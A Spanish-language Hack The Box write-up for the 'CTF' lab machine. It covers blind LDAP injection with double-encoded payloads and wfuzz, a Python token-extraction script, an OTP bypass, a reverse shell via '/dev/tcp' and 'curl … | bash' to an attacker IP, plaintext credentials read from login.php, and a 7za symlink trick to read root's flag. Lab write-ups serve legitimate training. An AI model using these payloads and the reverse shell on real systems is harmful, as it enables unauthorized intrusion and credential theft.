@@ -1,0 +1,444 @@
+---
+layout: post
+title: CTF
+date: 2023-06-23
+description:
+img:
+fig-caption:
+tags: []
+---
+___
+
+<center><img src="/writeups/assets/img/CTF-htb/CTF.png" alt="" style="height: 394px; width:520px;"></center>
+
+***
+
+# Conocimientos
+
+
+
+***
+
+# Reconocimiento
+
+## Escaneo de puertos con nmap
+
+### Descubrimiento de puertos abiertos
+
+```null
+nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.122 -oG openports
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-23 10:04 GMT
+Nmap scan report for 10.10.10.122
+Host is up (0.18s latency).
+Not shown: 65501 filtered tcp ports (no-response), 32 filtered tcp ports (host-prohibited)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 27.69 second
+```
+
+### Escaneo de versión y servicios de cada puerto
+
+```null
+nmap -sCV -p22,80 10.10.10.122 -oN portscan
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-23 10:04 GMT
+Nmap scan report for 10.10.10.122
+Host is up (0.057s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 fd:ad:f7:cb:dc:42:1e:43:7d:b3:d5:8b:ce:63:b9:0e (RSA)
+|   256 3d:ef:34:5c:e5:17:5e:06:d7:a4:c8:86:ca:e2:df:fb (ECDSA)
+|_  256 4c:46:e2:16:8a:14:f6:f0:aa:39:6c:97:46:db:b4:40 (ED25519)
+80/tcp open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: CTF
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.53 seconds
+```
+
+## Puerto 80 (HTTP)
+
+Con ```whatweb``` analizo las tecnologías que emplea el servidor web
+
+```null
+whatweb http://10.10.10.122
+http://10.10.10.122 [200 OK] Apache[2.4.6][mod_fcgid/2.3.9], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[CentOS][Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16], IP[10.10.10.122], JQuery, OpenSSL[1.0.2k-fips], PHP[5.4.16], Script, Title[CTF]
+```
+
+<img src="/writeups/assets/img/CTF-htb/1.png" alt="">
+
+Tengo acceso a un panel de inicio de sesión
+
+<img src="/writeups/assets/img/CTF-htb/2.png" alt="">
+
+Intercepto la petición con ```BurpSuite```para ver como se tramita
+
+```null
+POST /login.php HTTP/1.1
+Host: 10.10.10.122
+Content-Length: 33
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://10.10.10.122
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.10.10.122/login.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=vpmfgi3650l3no37pl07169053
+Connection: close
+
+inputUsername=rubbx&inputOTP=test
+```
+
+En el código fuente hay un comentario
+
+<img src="/writeups/assets/img/CTF-htb/3.png" alt="">
+
+El token es de 81 dígitos. Pruebo a bruteforcear caracteres especiales desde el ```Intruder``` de ```BurpSuite``` con el diccionario ```/usr/share/seclists/Fuzzing/special-chars.txt```
+
+<img src="/writeups/assets/img/CTF-htb/4.png" alt="">
+
+Desactivo el ```URL Encode``` automático
+
+<img src="/writeups/assets/img/CTF-htb/5.png" alt="">
+
+El ```&``` no se ve reflejado en el error de la respuesta
+
+<img src="/writeups/assets/img/CTF-htb/6.png" alt="">
+
+Y aquellas cuyo ```Content-Length``` es inferior, ni si quiera la cadena común. Principalmente son caracteres de operatoria; para sumar, restar, dividir...
+
+<img src="/writeups/assets/img/CTF-htb/7.png" alt="">
+
+Parece ser vulnerable a ```LDAP Inyection```. Es probable que se esté empleando una estructura parecida a esta:
+
+```null
+(&
+    (inputUsername=123)
+    (inputOTP=123)
+)
+```
+
+Lo que desconozco es cuantos campos tiene para cerrar el paréntesis final, así que voy a añadirlos manualmente, junto a un null byte para desplazar el resto de la query y que no entre en conflicto. Tienen que estar doblemente URL-encodeados, ya que si no la respuesta es vacía. Para tres, recibo datos
+
+```null
+inputUsername=rubbx%25%32%39%25%32%39%25%32%39%2500&inputOTP=123
+```
+
+<img src="/writeups/assets/img/CTF-htb/8.png" alt="">
+
+Evidentemente, el usuario no existe, y tampoco sirve de nada eliminar los paréntesis porque no aplicaría la inyección, pero puedo insertar un wildcard (*) doblemente url-encodeado, que en expresiones regulares actúa como un comodín
+
+```null
+inputUsername=%25%32%61%25%32%39%25%32%39%25%32%39%2500&inputOTP=123
+```
+
+<img src="/writeups/assets/img/CTF-htb/9.png" alt="">
+
+De esta manera puedo llegar a obtener usuarios válidos siguiendo las regex como condición booleana de ```true``` o ```false```, de la forma ```a*)))%00```, ```ad*)))%00```
+
+```null
+ wfuzz -c -s 1 --hh=2841 -w /usr/share/wordlists/SecLists/Fuzzing/char.txt -d 'inputUsername=FUZZ%252a%2529%2529%2529%2500&inputOTP=123' http://10.10.10.122/login.php
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.122/login.php
+Total requests: 26
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
+=====================================================================
+
+000000012:   200        68 L     231 W      2822 Ch     "l"                                                                                                                                             
+
+Total time: 0
+Processed Requests: 26
+Filtered Requests: 25
+Requests/sec.: 0
+```
+
+Empieza por ```l```, ahora si la incorporo como primer caracter, obtendré el segundo, y así sucesivamente
+
+```null
+wfuzz -c -s 1 --hh=2842 -w /usr/share/wordlists/SecLists/Fuzzing/char.txt -d 'inputUsername=lFUZZ%252a%2529%2529%2529%2500&inputOTP=123' http://10.10.10.122/login.php
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.122/login.php
+Total requests: 26
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
+=====================================================================
+
+000000004:   200        68 L     231 W      2822 Ch     "d"                                                                                                                                             
+
+Total time: 26.15709
+Processed Requests: 26
+Filtered Requests: 25
+Requests/sec.: 0.993994
+```
+
+Terminado el proceso el nombre de usuario es ```ldapuser```. Ahora solo me falta obtener el OTP. En ```LDAP``` se emplean atributos que puedo tratar de bruteforcear, ya que se están empleando otros campos que son los que he forzado a cerrar con los paréntesis y el null byte. La idea es abrir un nuevo campo, y en este añadir el atributo
+
+```null
+(&
+    (&
+        (inputUsername=ldapuser)
+        (inputOTP=123)
+        (atributo=*)))%00
+    )
+)
+```
+
+Utilizo un diccionario de [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/Intruder/LDAP_attributes.txt)
+
+```null
+wfuzz -c --hw=233 -w /home/rubbx/Desktop/HTB/Machines/CTF/LDAP_attributes.txt -d 'inputUsername=ldapuser%2529%2528FUZZ%253d%252a%2529%2529%2529%2500&inputOTP=123' http://10.10.10.122/login.php
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.122/login.php
+Total requests: 27
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
+=====================================================================
+
+000000015:   200        68 L     231 W      2822 Ch     "name"                                                                                                                                          
+000000025:   200        68 L     231 W      2822 Ch     "uid"                                                                                                                                           
+000000022:   200        68 L     231 W      2822 Ch     "sn"                                                                                                                                            
+000000024:   200        68 L     231 W      2822 Ch     "surname"                                                                                                                                       
+000000020:   200        68 L     231 W      2822 Ch     "pager"                                                                                                                                         
+000000017:   200        68 L     231 W      2822 Ch     "objectClass"                                                                                                                                   
+000000013:   200        68 L     231 W      2822 Ch     "mail"                                                                                                                                          
+000000002:   200        68 L     231 W      2822 Ch     "cn"                                                                                                                                            
+000000004:   200        68 L     231 W      2822 Ch     "commonName"                                                                                                                                    
+000000027:   200        68 L     231 W      2822 Ch     "userPassword"                                                                                                                                  
+
+Total time: 0
+Processed Requests: 27
+Filtered Requests: 17
+Requests/sec.: 0
+```
+
+Creo un diccionario de números
+
+```null
+seq 0 9 > digits.txt
+```
+
+Lo utilizo para extraer el token
+
+```null
+wfuzz -c --hw=233 -w /home/rubbx/Desktop/HTB/Machines/CTF/digits.txt -d 'inputUsername=ldapuser%2529%2528pager%253dFUZZ%252a%2529%2529%2529%2500&inputOTP=123' http://10.10.10.122/login.php
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.122/login.php
+Total requests: 10
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                        
+=====================================================================
+
+000000003:   200        68 L     231 W      2822 Ch     "2"                                                                                                                                            
+
+Total time: 0.354385
+Processed Requests: 10
+Filtered Requests: 9
+Requests/sec.: 28.21786
+```
+
+El concepto es el mismo que antes. Como son 81 dígitos, creo un script en ```python``` para automatizarlo
+
+```null
+catr ldi.py
+#!/usr/bin/python3
+
+from pwn import *
+import requests, pdb, time, signal, sys, string
+
+def def_handler(sig, frame):
+    sys.exit(1)
+
+# Ctrl+C
+signal.signal(signal.SIGINT, def_handler)
+
+# Variables globales
+
+main_url = "http://10.10.10.122/login.php"
+digits = string.digits
+
+def makeRequest():
+
+    token = ""
+    p1 = log.progress("Token")
+
+    for position in range(0, 81):
+        for digit in digits:
+            post_data = {
+                'inputUsername': f'ldapuser%29%28pager%3d{token}{digit}%2a%29%29%29%00',
+                'inputOTP': '123'
+            }
+
+            r = requests.post(main_url, data=post_data)
+            time.sleep(0.5)
+
+            if "Cannot login" in r.text:
+                token += digit
+                p1.status(token)
+                break
+
+
+if __name__ == '__main__':
+    makeRequest()
+```
+
+Lo ejecuto y obtengo el valor
+
+```null
+python3 ldi.py
+[┴] Token: 285449490011357156531651545652335570713167411445727140604172141456711102716717000
+```
+
+Utilizo ```stoken``` para obtener un OTP en base al tiempo
+
+```null
+stoken --token=285449490011357156531651545652335570713167411445727140604172141456711102716717000
+Enter PIN:
+PIN must be 4-8 digits.  Use '0000' for no PIN.
+Enter PIN:
+32661804
+```
+
+Se me abre un nuevo formulario al iniciar sesión
+
+<img src="/writeups/assets/img/CTF-htb/10.png" alt="">
+
+No puedo ejecutar comandos ya que el usuario ```ldapuser``` no pertenece al grupo ```root``` ni ```adm```
+
+<img src="/writeups/assets/img/CTF-htb/11.png" alt="">
+
+Para bypassear esta validación, voy a loggearme pero separando el resto de campos con ```ldapuser)))%00```  interceptando la petición con ```BurpSuite``` y dándole a ```Forward```. Puedo ejecutar comandos como ```apache`` 
+
+<img src="/writeups/assets/img/CTF-htb/12.png" alt="">
+
+Creo un archivo ```index.html``` que se encargue de enviarme una reverse shell
+
+```null
+#!/bin/bash
+
+bash -c 'bash -i >& /dev/tcp/10.10.16.3/443 0>&1'
+```
+
+Ejecuto un ```curl 10.10.16.3 | bash``` y recibo la conexión en una sesión de ```netcat```
+
+```null
+rlwrap nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.16.3] from (UNKNOWN) [10.10.10.122] 54680
+bash: no job control in this shell
+bash-4.2$ whoami
+whoami
+apache
+```
+
+En el archivo ```login.php``` hay credenciales en texto claro
+
+```null
+cat login.php | head -n 10
+<!doctype html>
+<?php
+session_start();
+$strErrorMsg="";
+
+$username = 'ldapuser';
+$password = 'e398e27d5c4ad45086fe431120932a01';
+
+$basedn = 'dc=ctf,dc=htb';
+$usersdn = 'cn=users';
+bash-4.2$ cat login.php | head -n 8
+cat login.php | head -n 8
+<!doctype html>
+<?php
+session_start();
+$strErrorMsg="";
+
+$username = 'ldapuser';
+$password = 'e398e27d5c4ad45086fe431120932a01';
+```
+
+Gano acceso como este usuario y puedo ver la primera flag
+
+```null
+ssh ldapuser@10.10.10.122
+The authenticity of host '10.10.10.122 (10.10.10.122)' can't be established.
+ED25519 key fingerprint is SHA256:KsoNG0lA4XNq0wTQoRJ93HGm0p+NwUq9+0Xl/ujMeSY.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.122' (ED25519) to the list of known hosts.
+ldapuser@10.10.10.122's password: 
+[ldapuser@ctf ~]$ cat user.txt 
+bb9c55c8f1ce024b8cf5dc47d29af631
+```
+
+# Escalada
+
+En el directorio ```backup``` hay un script en ```bash```
+
+```null
+[ldapuser@ctf backup]$ cat honeypot.sh 
+# get banned ips from fail2ban jails and update banned.txt
+# banned ips directily via firewalld permanet rules are **not** included in the list (they get kicked for only 10 seconds)
+/usr/sbin/ipset list | grep fail2ban -A 7 | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort -u > /var/www/html/banned.txt
+# awk '$1=$1' ORS='<br>' /var/www/html/banned.txt > /var/www/html/testfile.tmp && mv /var/www/html/testfile.tmp /var/www/html/banned.txt
+
+# some vars in order to be sure that backups are protected
+now=$(date +"%s")
+filename="backup.$now"
+pass=$(openssl passwd -1 -salt 0xEA31 -in /root/root.txt | md5sum | awk '{print $1}')
+
+# keep only last 10 backups
+cd /backup
+ls -1t *.zip | tail -n +11 | xargs rm -f
+
+# get the files from the honeypot and backup 'em all
+cd /var/www/html/uploads
+7za a /backup/$filename.zip -t7z -snl -p$pass -- *
+
+# cleaup the honeypot
+rm -rf -- *
+
+# comment the next line to get errors for debugging
+truncate -s 0 /backup/error.log
+```
+
+Como se están reportando los errores, puedo tratar de generar un error y crear un enlace simbólico para que un archivo apunte a la segunda flag mientras leo continuamente las últimas líneas de ```error.txt```
+
+```null
+bash-4.2$ touch @example
+touch @example
+bash-4.2$ ln -s -f /root/root.txt example
+```
+
+```null
+[ldapuser@ctf backup]$ tail -f error.log 
+
+WARNING: No more files
+70de1bd8f0ad63bacdf53aab29466ad4
+
+tail: error.log: file truncated
+```
